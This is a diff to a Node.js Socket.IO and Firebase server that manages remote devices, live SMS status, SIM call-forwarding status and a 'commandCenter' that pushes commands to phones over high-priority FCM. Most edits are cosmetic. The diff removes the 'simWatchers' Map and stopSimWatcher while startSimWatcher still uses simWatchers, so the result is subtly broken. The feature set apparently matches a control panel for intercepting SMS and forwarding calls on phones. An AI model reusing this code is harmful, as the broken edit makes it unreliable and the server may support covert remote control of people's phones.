@@ -1,6 +1,5 @@
 // ===============================================
-//  SERVER.JS — ULTRA FINAL MASTER VERSION
-//  (SMS LIVE + SIM FORWARD LIVE + DEVICE LIVE)
+//  SERVER.JS — FINAL MASTER VERSION (SMS + SIM LIVE)
 // ===============================================
 
 import dotenv from "dotenv";
@@ -37,7 +36,7 @@ app.set("io", io);
 const deviceSockets = new Map();
 let lastDevicesList = [];
 
-// Utility cleaner
+// Utility
 const clean = (id) => id?.toString()?.trim()?.toUpperCase();
 
 // ======================================================
@@ -67,7 +66,7 @@ async function sendFcmHighPriority(token, type, payload = {}) {
 }
 
 // ======================================================
-//       🟢 BUILD DEVICE LIST
+//       🟢 BUILD DEVICES LIST
 // ======================================================
 async function buildDevicesList() {
   const [devSnap, statusSnap] = await Promise.all([
@@ -94,7 +93,7 @@ async function buildDevicesList() {
 }
 
 // ======================================================
-//       🟢 PUSH DEVICE LIST TO ALL DASHBOARDS
+//       🟢 PUSH FULL DEVICES LIST TO DASHBOARD
 // ======================================================
 async function refreshDevicesLive(reason = "") {
   try {
@@ -122,7 +121,7 @@ io.on("connection", async (socket) => {
 
   let currentDeviceId = null;
 
-  // Send initial devices list
+  // Send initial device list
   try {
     const initialDevices =
       lastDevicesList?.length ? lastDevicesList : await buildDevicesList();
@@ -157,10 +156,9 @@ io.on("connection", async (socket) => {
     refreshDevicesLive(`deviceOnline:${id}`);
   });
 
-  // Device disconnect
+  // Disconnect
   socket.on("disconnect", async () => {
     console.log("🔌 Disconnect:", socket.id);
-
     if (currentDeviceId) {
       await rtdb.ref(`status/${currentDeviceId}`).set({
         connectivity: "Offline",
@@ -195,10 +193,13 @@ function startBrosWatcher(uid) {
 
   ref.on("value", (snap) => {
     if (!snap.exists()) {
-      io.emit("brosReplyUpdate", { uid, success: true, data: null });
+      io.emit("brosReplyUpdate", {
+        uid,
+        success: true,
+        data: null,
+      });
       return;
     }
-
     const data = snap.val();
 
     io.emit("brosReplyUpdate", {
@@ -211,6 +212,7 @@ function startBrosWatcher(uid) {
   brosWatchers.set(uid, ref);
 }
 
+// API
 app.get("/api/brosreply/:uid", async (req, res) => {
   try {
     const uid = clean(req.params.uid);
@@ -222,14 +224,18 @@ app.get("/api/brosreply/:uid", async (req, res) => {
 
     startBrosWatcher(uid);
 
-    res.json({ success: true, data, message: "Live listening started" });
+    res.json({
+      success: true,
+      data,
+      message: "Live listening started",
+    });
   } catch (err) {
     res.status(500).json({ success: false });
   }
 });
 
 // ======================================================
-//       🟢 LIVE: SMS STATUS
+//       🟢 LIVE: SMS STATUS (commandCenter/smsStatus/{uid})
 // ======================================================
 const smsWatchers = new Map();
 
@@ -264,6 +270,7 @@ function startSmsWatcher(uid) {
   smsWatchers.set(uid, ref);
 }
 
+// API
 app.get("/api/device/:uid/sms-status", async (req, res) => {
   try {
     const uid = clean(req.params.uid);
@@ -293,19 +300,8 @@ app.get("/api/device/:uid/sms-status", async (req, res) => {
 });
 
 // ======================================================
-//       🟢 LIVE: SIM FORWARD
+//       🟢 LIVE: SIM FORWARD (simForwardStatus/{uid})
 // ======================================================
-const simWatchers = new Map();
-
-function stopSimWatcher(uid) {
-  if (simWatchers.has(uid)) {
-    const ref = simWatchers.get(uid);
-    ref.off();
-    simWatchers.delete(uid);
-    console.log("🛑 SIM watcher stopped:", uid);
-  }
-}
-
 function startSimWatcher(uid) {
   console.log("🎧 SIM Watcher STARTED for UID:", uid);
 
@@ -318,10 +314,9 @@ function startSimWatcher(uid) {
     }
 
     const raw = snap.val();
-
-    const list = Object.keys(raw).map((slot) => ({
-      simSlot: Number(slot),
-      ...raw[slot],
+    const list = Object.keys(raw).map(k => ({
+      simSlot: Number(k),
+      ...raw[k]
     }));
 
     list.sort((a, b) => b.updatedAt - a.updatedAt);
@@ -338,6 +333,7 @@ function startSimWatcher(uid) {
   simWatchers.set(uid, ref);
 }
 
+// API
 app.get("/api/device/:uid/sim-forward", async (req, res) => {
   try {
     const uid = clean(req.params.uid);
@@ -351,7 +347,6 @@ app.get("/api/device/:uid/sim-forward", async (req, res) => {
       Object.entries(snap.val()).forEach(([slot, obj]) =>
         list.push({ simSlot: Number(slot), ...obj })
       );
-
       list.sort((a, b) => b.updatedAt - a.updatedAt);
     }
 
@@ -374,6 +369,7 @@ rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
   if (!snap.exists()) return;
 
   const adminData = snap.val();
+  console.log("🛠 Admin updated:", adminData);
 
   const all = await rtdb.ref("registeredDevices").get();
   if (!all.exists()) return;
@@ -420,7 +416,7 @@ rtdb.ref("commandCenter/deviceCommands").on("child_added", handleDeviceCommandCh
 rtdb.ref("commandCenter/deviceCommands").on("child_changed", handleDeviceCommandChange);
 
 // ======================================================
-//    CHECK ONLINE LIVE HANDLER
+//    CHECK ONLINE (RESET CLOCK)
 // ======================================================
 async function handleCheckOnlineChange(snap) {
   if (!snap.exists()) return;
@@ -478,5 +474,5 @@ app.get("/", (_, res) => {
 
 // ======================================================
 server.listen(PORT, () => {
-  console.log(`🚀 Server running on PORT ${PORT}`);
+  console.log(` Server running on PORT ${PORT}`);
 });
